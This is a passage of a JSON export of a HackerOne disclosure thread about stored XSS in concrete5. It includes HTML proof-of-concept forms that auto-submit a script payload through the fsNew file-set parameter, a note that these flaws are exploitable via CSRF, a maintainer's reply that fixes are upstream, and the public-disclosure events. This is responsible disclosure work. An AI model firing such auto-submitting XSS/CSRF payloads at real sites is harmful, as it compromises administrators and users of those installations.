class=\"nx\"\u003eforms\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe injected JavaScript code will be executed every time an user visit a page like http://[host]/concrete5/index.php/dashboard/extend/.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cstrong\u003efsNew POST parameter when adding/editing a file set\u003c/strong\u003e - the vulnerability can still be exploited using the following PoC:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://localhost/concrete5/index.php/ccm/system/dialogs/file/sets/submit?fID=1\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;fsNew[]\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;script\u0026gt;alert(/XSS/)\u0026lt;/script\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eforms\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003esubmit\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe injected JavaScript code will be executed every time an user go to the http://[host]/concrete5/index.php/dashboard/files/search page, clicks on a file to show up the menu and then hits the \u0026quot;Set\u0026quot; item.\u003c/p\u003e\n\n\u003cp\u003ePlease note that all of these issues could be exploited via CSRF attacks because of the vulnerability reported to \u003ca href=\"/reports/59660\"\u003e#59660\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-12-23T17:42:01.087Z","updated_at":"2015-12-23T17:42:01.087Z","actor":{"username":"egix","cleared":false,"url":"/egix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/431/9435ac0bb25492f164582fbbc7e3f6f8f016b1d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":733627,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"These should be fixed in the upstream, not yet in the latest release.","markdown_message":"\u003cp\u003eThese should be fixed in the upstream, not yet in the latest release.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-12-28T02:20:02.913Z","updated_at":"2015-12-28T02:20:02.913Z","actor":{"username":"korvin","cleared":false,"url":"/korvin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yi9xvfnDmjKpKA1reqNSwGct/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":987818,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-27T18:28:23.743Z","updated_at":"2016-05-27T18:28:23.743Z","first_to_agree":true,"actor":{"username":"egix","cleared":false,"url":"/egix","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/431/9435ac0bb25492f164582fbbc7e3f6f8f016b1d1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1038259,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-26T18:28:25.315Z","updated_at":"2016-06-26T18:28:25.315Z","actor":{"url":"/concrete5","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/060/c549a89ab4a3550cb9bfdeba1bee6d77e2019c7e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"concrete5"}},"genius_execution_id":null,"team_handle":"concrete5","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}